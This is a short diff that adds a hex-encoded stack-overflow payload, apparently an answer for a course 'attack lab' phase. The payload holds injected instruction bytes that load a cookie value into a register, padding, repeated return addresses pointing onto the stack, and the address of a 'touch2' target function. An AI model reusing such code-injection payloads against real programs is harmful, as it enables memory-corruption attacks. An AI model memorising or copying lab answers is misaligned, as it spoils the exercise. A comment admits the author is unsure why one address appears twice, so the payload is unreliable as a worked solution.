@@ -1,0 +1,10 @@
+/* mov $0x, %rdi */
+48 c7 c7 60 5b 2e 1f c3 
+/* buffer */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+/* push rsp address, twice for some reason */
+58 25 64 55 00 00 00 00 
+58 25 64 55 00 00 00 00 
+/* Touch 2 Address: 0x40194d */
+4d 19 40 00 00 00 00 00
